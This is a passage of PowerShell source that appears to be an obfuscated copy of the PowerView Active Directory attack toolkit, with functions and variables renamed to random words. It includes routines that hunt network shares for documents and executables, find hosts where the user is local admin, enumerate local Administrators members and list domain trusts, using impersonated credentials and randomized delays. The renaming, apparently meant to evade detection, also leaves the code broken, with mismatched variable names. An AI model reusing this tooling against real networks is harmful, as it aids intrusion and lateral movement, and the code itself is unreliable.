        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $rZqUJwQL99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $DXnIJKyo99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $KMUtBgIc99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $ohvTlzbv99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $wCkPnMUb99 = 20
    )
    BEGIN {
        $tgaaoeGR99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['ComputerName']) {
            $EqAZlVKw99 = $VrEmrUHq99
        }
        else {
            Write-Verbose '[indignantly] Querying computers in the domain'
            $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[indignantly] TargetComputers length: $($EqAZlVKw99.Length)"
        if ($EqAZlVKw99.Length -eq 0) {
            throw '[indignantly] No hosts found to enumerate'
        }
        $kEgRxIzp99 = {
            Param($VrEmrUHq99, $CuygeMzO99, $OxWrrBbt99, $DXnIJKyo99, $dnROoQma99, $KMUtBgIc99, $SbmYKKRw99, $BmRRNCwx99)
            if ($BmRRNCwx99) {
                $Null = admonished -TokenHandle $BmRRNCwx99 -Quiet
            }
            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
                $BwflBmXy99 = @()
                if ($BumNVGRu99.StartsWith('\\')) {
                    $BwflBmXy99 += $BumNVGRu99
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
                    if ($Up) {
                        $OPByCexH99 = well -ComputerName $BumNVGRu99
                        ForEach ($Share in $OPByCexH99) {
                            $cjvROwQJ99 = $Share.Name
                            $Path = '\\'+$BumNVGRu99+'\'+$cjvROwQJ99
                            if (($cjvROwQJ99) -and ($cjvROwQJ99.Trim() -ne '')) {
                                if ($OxWrrBbt99 -NotContains $cjvROwQJ99) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $BwflBmXy99 += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach ($Share in $BwflBmXy99) {
                    Write-Verbose "Searching share: $Share"
                    $BOOBPBNd99 = @{
                        'Path' = $Share
                        'Include' = $CuygeMzO99
                    }
                    if ($DXnIJKyo99) {
                        $BOOBPBNd99['OfficeDocs'] = $DXnIJKyo99
                    }
                    if ($KMUtBgIc99) {
                        $BOOBPBNd99['FreshEXEs'] = $KMUtBgIc99
                    }
                    if ($uKMZoAej99) {
                        $BOOBPBNd99['LastAccessTime'] = $uKMZoAej99
                    }
                    if ($QRdxeHwL99) {
                        $BOOBPBNd99['LastWriteTime'] = $QRdxeHwL99
                    }
                    if ($rZqUJwQL99) {
                        $BOOBPBNd99['CreationTime'] = $rZqUJwQL99
                    }
                    if ($SbmYKKRw99) {
                        $BOOBPBNd99['CheckWriteAccess'] = $SbmYKKRw99
                    }
                    overlapping @SearchArgs
                }
            }
            if ($BmRRNCwx99) {
                Nina
            }
        }
        $WUqPycDr99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $WUqPycDr99 = admonished -Credential $gxazvivN99
            }
            else {
                $WUqPycDr99 = admonished -Credential $gxazvivN99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[indignantly] Total number of hosts: $($EqAZlVKw99.count)"
            Write-Verbose "[indignantly] Delay: $Delay, Jitter: $ohvTlzbv99"
            $zLofmUyR99 = 0
            $ZqgWUqYA99 = New-Object System.Random
            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
                $zLofmUyR99 = $zLofmUyR99 + 1
                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
                Write-Verbose "[indignantly] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
                Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $CuygeMzO99, $OxWrrBbt99, $DXnIJKyo99, $dnROoQma99, $KMUtBgIc99, $SbmYKKRw99, $WUqPycDr99
            }
        }
        else {
            Write-Verbose "[indignantly] Using threading with threads: $wCkPnMUb99"
            $qczwSIpm99 = @{
                'Include' = $CuygeMzO99
                'ExcludedShares' = $OxWrrBbt99
                'OfficeDocs' = $DXnIJKyo99
                'ExcludeHidden' = $dnROoQma99
                'FreshEXEs' = $KMUtBgIc99
                'CheckWriteAccess' = $SbmYKKRw99
                'TokenHandle' = $WUqPycDr99
            }
            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function AstroTurf {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $VrEmrUHq99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cdytPdAI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $glLCVedN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrwfvIMy99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $fGipudMB99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $JKXRZnBu99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GtxmnElz99,
        [Switch]
        $nvVkzIIC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $ohvTlzbv99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $wCkPnMUb99 = 20
    )
    BEGIN {
        $tgaaoeGR99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
        if ($PSBoundParameters['Unconstrained']) { $tgaaoeGR99['Unconstrained'] = $DZNONYED99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['ComputerName']) {
            $EqAZlVKw99 = $VrEmrUHq99
        }
        else {
            Write-Verbose '[AstroTurf] Querying computers in the domain'
            $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[AstroTurf] TargetComputers length: $($EqAZlVKw99.Length)"
        if ($EqAZlVKw99.Length -eq 0) {
            throw '[AstroTurf] No hosts found to enumerate'
        }
        $kEgRxIzp99 = {
            Param($VrEmrUHq99, $BmRRNCwx99)
            if ($BmRRNCwx99) {
                $Null = admonished -TokenHandle $BmRRNCwx99 -Quiet
            }
            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
                if ($Up) {
                    $ZcslebsY99 = Abelson -ComputerName $BumNVGRu99
                    if ($ZcslebsY99.IsAdmin) {
                        $BumNVGRu99
                    }
                }
            }
            if ($BmRRNCwx99) {
                Nina
            }
        }
        $WUqPycDr99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $WUqPycDr99 = admonished -Credential $gxazvivN99
            }
            else {
                $WUqPycDr99 = admonished -Credential $gxazvivN99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[AstroTurf] Total number of hosts: $($EqAZlVKw99.count)"
            Write-Verbose "[AstroTurf] Delay: $Delay, Jitter: $ohvTlzbv99"
            $zLofmUyR99 = 0
            $ZqgWUqYA99 = New-Object System.Random
            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
                $zLofmUyR99 = $zLofmUyR99 + 1
                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
                Write-Verbose "[AstroTurf] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
                Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $WUqPycDr99
            }
        }
        else {
            Write-Verbose "[AstroTurf] Using threading with threads: $wCkPnMUb99"
            $qczwSIpm99 = @{
                'TokenHandle' = $WUqPycDr99
            }
            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
        }
    }
}
function strutting {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $VrEmrUHq99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cdytPdAI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $glLCVedN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrwfvIMy99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $fGipudMB99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $JKXRZnBu99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GtxmnElz99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $SZjbzmKX99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $AlrHOHqQ99 = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $ohvTlzbv99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $wCkPnMUb99 = 20
    )
    BEGIN {
        $tgaaoeGR99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
        if ($PSBoundParameters['Unconstrained']) { $tgaaoeGR99['Unconstrained'] = $DZNONYED99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['ComputerName']) {
            $EqAZlVKw99 = $VrEmrUHq99
        }
        else {
            Write-Verbose '[strutting] Querying computers in the domain'
            $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[strutting] TargetComputers length: $($EqAZlVKw99.Length)"
        if ($EqAZlVKw99.Length -eq 0) {
            throw '[strutting] No hosts found to enumerate'
        }
        $kEgRxIzp99 = {
            Param($VrEmrUHq99, $SZjbzmKX99, $AlrHOHqQ99, $BmRRNCwx99)
            if ($SZjbzmKX99 -eq "Administrators") {
                $YakjKSkd99 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $SZjbzmKX99 = ($YakjKSkd99.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if ($BmRRNCwx99) {
                $Null = admonished -TokenHandle $BmRRNCwx99 -Quiet
            }
            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
                if ($Up) {
                    $OBvgdrJs99 = @{
                        'ComputerName' = $BumNVGRu99
                        'Method' = $AlrHOHqQ99
                        'GroupName' = $SZjbzmKX99
                    }
                    stipends @NetLocalGroupMemberArguments
                }
            }
            if ($BmRRNCwx99) {
                Nina
            }
        }
        $WUqPycDr99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $WUqPycDr99 = admonished -Credential $gxazvivN99
            }
            else {
                $WUqPycDr99 = admonished -Credential $gxazvivN99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[strutting] Total number of hosts: $($EqAZlVKw99.count)"
            Write-Verbose "[strutting] Delay: $Delay, Jitter: $ohvTlzbv99"
            $zLofmUyR99 = 0
            $ZqgWUqYA99 = New-Object System.Random
            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
                $zLofmUyR99 = $zLofmUyR99 + 1
                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
                Write-Verbose "[strutting] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
                Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $SZjbzmKX99, $AlrHOHqQ99, $WUqPycDr99
            }
        }
        else {
            Write-Verbose "[strutting] Using threading with threads: $wCkPnMUb99"
            $qczwSIpm99 = @{
                'GroupName' = $SZjbzmKX99
                'Method' = $AlrHOHqQ99
                'TokenHandle' = $WUqPycDr99
            }
            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function cryogenics {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $rPozaKft99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $dAsLqcAM99 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }
        $XXyZVOiE99 = @{}
        if ($PSBoundParameters['Domain']) { $XXyZVOiE99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['LDAPFilter']) { $XXyZVOiE99['LDAPFilter'] = $HOOTOEqu99 }
        if ($PSBoundParameters['Properties']) { $XXyZVOiE99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $XXyZVOiE99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $XXyZVOiE99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $XXyZVOiE99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $XXyZVOiE99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XXyZVOiE99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $XXyZVOiE99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $XXyZVOiE99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $KQThjCTH99 = @{}
            if ($SSNUOPgW99 -and $SSNUOPgW99.Trim() -ne '') {
                $XuRFhJVk99 = $SSNUOPgW99
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $XuRFhJVk99 = (debater -Credential $gxazvivN99).Name
                }
                else {
                    $XuRFhJVk99 = (debater).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($SSNUOPgW99 -and $SSNUOPgW99.Trim() -ne '') {
                $XuRFhJVk99 = $SSNUOPgW99
            }
            else {
                $XuRFhJVk99 = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            $GQnnQEfn99 = watersides @LdapSearcherArguments
            $anzhpHHN99 = disobedience @NetSearcherArguments
            if ($GQnnQEfn99) {
                $GQnnQEfn99.Filter = '(objectClass=trustedDomain)'
                if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $GQnnQEfn99.FindOne() }
                else { $pfqXXMQd99 = $GQnnQEfn99.FindAll() }
                $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $YCTthRKk99 = New-Object PSObject
                    $KMfKgbQi99 = @()
                    $KMfKgbQi99 += $dAsLqcAM99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $dAsLqcAM99[$_] }
                    $ujzFOdNr99 = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }
                    $fHAIwgIV99 = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }
                    $GmeuRAOD99 = $Props.distinguishedname[0]
                    $jHENsTaV99 = $GmeuRAOD99.IndexOf('DC=')
                    if ($jHENsTaV99) {
                        $XuRFhJVk99 = $($GmeuRAOD99.SubString($jHENsTaV99)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $XuRFhJVk99 = ""
                    }
                    $ARzOsoma99 = $GmeuRAOD99.IndexOf(',CN=System')
                    if ($jHENsTaV99) {
                        $IayDthuO99 = $GmeuRAOD99.SubString(3, $ARzOsoma99-3)
                    }
                    else {
                        $IayDthuO99 = ""
                    }
                    $vvjXjOgW99 = New-Object Guid @(,$Props.objectguid[0])
                    $pZtebdhW99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $YCTthRKk99 | Add-Member Noteproperty 'SourceName' $XuRFhJVk99
                    $YCTthRKk99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $YCTthRKk99 | Add-Member Noteproperty 'TrustType' $fHAIwgIV99
                    $YCTthRKk99 | Add-Member Noteproperty 'TrustAttributes' $($KMfKgbQi99 -join ',')
                    $YCTthRKk99 | Add-Member Noteproperty 'TrustDirection' "$ujzFOdNr99"
                    $YCTthRKk99 | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $YCTthRKk99 | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $YCTthRKk99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $YCTthRKk99
                }
                if ($pfqXXMQd99) {
                    try { $pfqXXMQd99.dispose() }
                    catch {
                        Write-Verbose "[cryogenics] Error disposing of the Results object: $_"
                    }
                }
                $GQnnQEfn99.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            if ($PSBoundParameters['Server']) {
                $gmvsdZjZ99 = $mSxqoOjK99
            }
            elseif ($SSNUOPgW99 -and $SSNUOPgW99.Trim() -ne '') {
                $gmvsdZjZ99 = $SSNUOPgW99
            }
            else {
                $gmvsdZjZ99 = $Null
            }
            $TuHFtCTR99 = [IntPtr]::Zero
            $Flags = 63
            $QccMrSGE99 = 0
            $fYOedlSN99 = $eIekXKWj99::DsEnumerateDomainTrusts($gmvsdZjZ99, $Flags, [ref]$TuHFtCTR99, [ref]$QccMrSGE99)
            $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
            if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
                $TYJIVmOK99 = $ZELCewrO99::GetSize()
                for ($i = 0; ($i -lt $QccMrSGE99); $i++) {
                    $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
                    $Info = $UeHktdvI99 -as $ZELCewrO99
                    $KUsFrgdb99 = $UeHktdvI99.ToInt64()
                    $KUsFrgdb99 += $TYJIVmOK99
                    $LheQlAxo99 = ''
                    $fYOedlSN99 = $hVuDLVbw99::ConvertSidToStringSid($Info.DomainSid, [ref]$LheQlAxo99);$HWqgzfQS99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($fYOedlSN99 -eq 0) {
                        Write-Verbose "[cryogenics] Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
                    }
                    else {
                        $YCTthRKk99 = New-Object PSObject
                        $YCTthRKk99 | Add-Member Noteproperty 'SourceName' $XuRFhJVk99
                        $YCTthRKk99 | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $YCTthRKk99 | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $YCTthRKk99 | Add-Member Noteproperty 'Flags' $Info.Flags
                        $YCTthRKk99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $YCTthRKk99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $YCTthRKk99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $YCTthRKk99 | Add-Member Noteproperty 'TargetSid' $LheQlAxo99
                        $YCTthRKk99 | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $YCTthRKk99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $YCTthRKk99
                    }
                }
                $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
            }
            else {
                Write-Verbose "[cryogenics] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
            }
        }
        else {
            $jAPRADZj99 = debater @NetSearcherArguments
            if ($jAPRADZj99) {
                $jAPRADZj99.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}
function victory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZKthMMjt99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $RYyNPlEK99 = @{}
